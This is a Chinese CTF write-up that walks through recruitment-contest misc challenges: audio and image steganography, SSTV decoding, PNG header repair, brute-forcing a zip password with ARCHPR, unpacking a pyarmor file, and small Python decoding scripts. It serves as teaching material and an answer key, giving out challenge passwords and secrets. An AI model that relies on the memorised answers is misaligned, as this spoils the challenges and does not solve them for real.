![assets/9d54044f3ebea54d2e5f4eed6b7e0a0b_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052239-2115931204.gif)

发现需要密钥，根据deepsound隐写特性可知一定是deepsound

隐写，寻找密钥。

010editor打开后在文件尾发现可疑16进制编码

![assets/5d95c97aadf6edc19060e5549eac9e6e_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052612-832276225.gif)

cyberchef解密

![assets/13331d641964edfde6abdcfd182ed2ec_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205051601-1627646332.gif)

得到密钥just_hear_the_DeepSound！![assets/2864169b74118eb205ffe91ed04e7b06_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052883-1447915600.gif)

得到一个摩斯密码音频，找网站解密[https://morsecodemagic.com/zh/](https://morsecodemagic.com/zh/)

选择上方音频解码器

![assets/9f74d0b1b113200d46cde10a274d5600_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205051653-1462942625.gif)

这里有个小坑，把解码后结果小写才是flag压缩包密钥

![assets/52be5a1a6731e5b2bc57e099ebd0428e_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052320-1904409614.gif)

![assets/e508468bb7f389d3c357657cf524a21f_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052211-1478775340.gif)
## BASIC

根据题目描述，可以知道是png的最低位隐写

使用stegsolve

![assets/9b6d728bf072073312e2295e84994c35_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052479-1869077815.gif)

需要注意，flag信息隐藏在图片开头的rgb值中，选择对应通道之后点击preview需要上拉

## 像素星图的共振频率
附件voice是sstv，可以通过windows的rx-sstv虚拟声卡播放获得界面
这里介绍另一种linux音频导入方法
下载QSSTV
下好后把音频转成wav格式，直接导入会出现下图信息
![assets/通武廊wp/3a358fb82f4a2bd6000ae1b29c9306f7.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052944-1988430146.png)
QSSTV的github里有写解决方案
```
When using a file source for decoding, for some valid files QSSTV will fail with the error message "Invalid Header Format". This appears to be due to the decoder requiring that the first two chunks of the RIFF file are fmt and data. However, programs that create WAV files will often have chunks like INFO and auxi before the data chunk.

As a workaround, sox can be used to remove these chunks, e.g.

sox SOURCE.wav DESTINATION.wav
```
下载sox转wav后即可显示内容
![assets/通武廊wp/808dd0e0ffa299ecfa133735ce0d235b.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052792-729662529.png)
`this_is_a_very_long_phrase_that_hopefully_is_not_in_any_dictionary`

> 这里引用的是我的世界20w14∞版本的加密内容，详细可戳[20w14infinite - 中文 Minecraft Wiki](https://zh.minecraft.wiki/w/20w14infinite?variant=zh) 
压缩包末尾藏了东西
![assets/通武廊wp/file-20250825141755903.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052649-1595415006.png)

发现是base85，转换后出现明文提示
![assets/通武廊wp/file-20250825141906813.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205051882-229012518.png)
搜索后可以发现github仓库，进而发现这个[光棱坦克工厂](https://prism.uyanide.com/)
图片放进去可以直接解密
## Crossfire

拖入010editor中，发现明显的png文件格式IHDR，缺少文件头尾，手动补上。

![assets/e85e3040f010e6cb7a9416a3e863e5e0_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205055564-1805136723.gif)

补上文件头尾之后修改后缀名为.png

发现图片中枪械之后一半，可以确定图片高度被调整过

![assets/4c00659b72cd26f934bb77fd14a55d67_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052404-123823114.gif)


## three-body

根据题目描述，可知第一层压缩包的密码为三位数字，使用archpr破解

![assets/f811e57a81cf018feec023a64f361dbb_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052526-1501569177.gif)![assets/b6f73e35d5fc79812856f8d95ef3aa30_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052476-2015594338.gif)

解压后是一张png图片，像素异常为160000*1![assets/61b0a535d83d48d089cef8140b24cf64_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052354-1219911981.gif)

结合题目描述与常识可以推测，这里是把一张图片的像素依次排列成一条线，这就是描述中三体人的武器，把二维平面转化为一条线。。结合背景中秘籍是正方形的信息，可以知道原始图片宽高为400\*400，写脚本转化。
```python
from PIL import Image
# 输入的长条形图片路径（1×160000）
input_path = "output.png"  # 替换为实际的长条形图片路径
# 还原后的图片输出路径（400×400）
output_path = "restored.png"
try:
    with Image.open(input_path) as img:
        # 获取长条形图片的尺寸
        width, height = img.size
        # 验证输入图片是否符合要求（1×160000）
        if width != 160000 or height != 1:
            raise ValueError("输入图片必须是1×160000的PNG图片")
        # 获取所有像素数据（一维列表，共160000个像素）
        pixels = list(img.getdata())
        # 计算原始图片的宽度和高度（400×400）
        original_width = 400
        original_height = 400
        # 创建新图片用于存储还原后的像素
        new_img = Image.new(img.mode, (original_width, original_height))
        # 将一维像素列表重新分割为400行，每行400个像素
        for y in range(original_height):
            # 计算当前行像素在一维列表中的起始和结束索引
            start = y * original_width
            end = start + original_width
            # 提取当前行的像素
            row_pixels = pixels[start:end]
            # 将像素放入新图片的对应行
            for x in range(original_width):
                new_img.putpixel((x, y), row_pixels[x])
        # 保存还原后的图片
        new_img.save(output_path)
        print(f"图片还原完成，已保存至：{output_path}")
except Exception as e:
    print(f"还原失败：{e}")
```


![assets/d084b45ef4cec4204c526f6c7c62c911_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052467-1387370996.gif)

还原后得到一张二维码，扫码获得flag

![assets/0a6357bf18e4c8ac11f5622a954ef0f6_MD5.gif](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052186-1698689171.gif)

## 别黑我
打开就可以解压（无毒请放心），其中有pyarmor和密文
![assets/纳新赛WriteUp/file-20251211203522631.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052315-1156846689.png)
使用该工具进行pyarmor逆向
https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot/releases
![assets/纳新赛WriteUp/file-20251211203708208.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052760-48369263.png)
发现虽然没解开但是有secret内容
![assets/纳新赛WriteUp/file-20251211203735231.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052455-966299624.png)
base32解密后可以看出逻辑
![assets/纳新赛WriteUp/file-20251211204028804.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205051984-1566571680.png)
结合上面的mapping和spore可以组合出完整加密代码，进而推出解密代码
```
def mushroom_spore_decode(encoded):

    mapping = {'别': '0', '黑': '1', '虎': '2'}

    spore = '别黑我虎'

    result = []

    i = 0

    while i < len(encoded):

        if encoded[i:i+4] == spore:

            i += 4

            chunk = []

            while encoded[i:i+4] != spore:

                if encoded[i:i+2] == '虎':

                    chunk.append('2')

                    i += 2

                elif encoded[i] == '别':

                    chunk.append('0')

                    i += 1

                elif encoded[i] == '黑':

                    chunk.append('1')

                    i += 1

                else:

                    i += 1  # 跳过异常字符

            i += 4  # 跳过结尾spore

            ternary = ''.join(chunk)

            num = int(ternary, 3)

            result.append(chr(num))

        else:

            i += 1

    return ''.join(result)

  

# 读取文件内容

with open('strange.bieheiwohu', 'r', encoding='utf-8') as f:

    data = f.read()

  

decoded = mushroom_spore_decode(data)

print(decoded)
```
![assets/纳新赛WriteUp/file-20251211204234982.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205051843-828816820.png)
## 计算机网络
题目提示用Cisco Packet Tracer打开附件
打开后发现放了很多杂乱的东西
![assets/纳新赛WriteUp/file-20251211204317572.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052602-782556662.png)
题目又提示打开记得虚拟电脑（PC），于是打开PC里的文本编辑器或者tftp server
![assets/纳新赛WriteUp/file-20251211204424381.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052111-471281067.png)发现有密文
![assets/纳新赛WriteUp/file-20251211204451246.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052326-2137844042.png)随波逐流解密即可
![assets/纳新赛WriteUp/file-20251211204510112.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205053240-1382917143.png)
## 问卷题？
爆搜就可以搜出来
![assets/纳新赛WriteUp/file-20251211204722179.png](/assets/cnblogs/CPPU-ISA纳新赛/3539156-20251211205052445-1306427194.png)
问卷虽然无法填写但是返回路由中仍然返回了提示语，可以得到flag
